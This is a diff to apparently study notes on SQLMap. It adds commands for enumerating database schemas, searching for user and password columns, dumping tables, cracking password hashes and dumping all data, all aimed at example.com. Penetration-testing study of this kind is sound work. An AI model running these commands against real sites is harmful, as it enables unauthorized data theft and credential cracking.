@@ -406,10 +406,6 @@ SQLMap provides various options to fine-tune SQL injection (SQLi) attempts, impr
 
 ---
 
-Here is a markdown version of the notes based on the content you've provided:
-
----
-
 # Database Enumeration
 
 ## **Overview**
@@ -513,6 +509,67 @@ System databases are typically not relevant for penetration tests, so the `--exc
 ```bash
 $ sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
 ```
+
+
+---
+
+# Advanced Database Enumeration with SQLMap
+
+## **DB Schema Enumeration**
+To retrieve the structure of all the tables in a database and get an overview of its architecture, you can use the `--schema` switch. This command retrieves information on each database, its tables, and the associated column details.
+
+### Example Command:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --schema
+```
+
+## **Searching for Data**
+When dealing with large databases with numerous tables and columns, the `--search` option can be used to search for specific names or keywords within tables and columns.
+
+### Searching for Tables:
+To search for tables containing a specific keyword, use:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --search -T user
+```
+
+### Searching for Columns:
+To search for columns containing a specific keyword (e.g., `pass`), use:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
+```
+
+### Sample Output:
+- **Table search for 'user':**
+  - Database: testdb - Table: users
+  - Database: mysql - Table: user
+
+- **Column search for 'pass':**
+  - Database: owasp10 - Table: accounts (password)
+  - Database: master - Table: users (password)
+
+## **Password Enumeration and Cracking**
+When a table with passwords is identified (e.g., a `password` column), SQLMap can retrieve and attempt to crack password hashes using a dictionary-based attack.
+
+### Example Command:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
+```
+
+### Hash Cracking:
+- If SQLMap detects password hashes, it prompts the user to attempt cracking them using a dictionary file.
+- It supports over 30 hash types and can use a default dictionary with over 1.4 million entries.
+
+## **DB Users Password Enumeration and Cracking**
+SQLMap can also retrieve password hashes from system tables, such as those containing database-specific credentials, with the `--passwords` switch.
+
+### Example Command:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+```
+
+
+### Tip:
+You can use the `--all` and `--batch` switches together to automatically enumerate and dump all available data from the database.
 
 ---
 
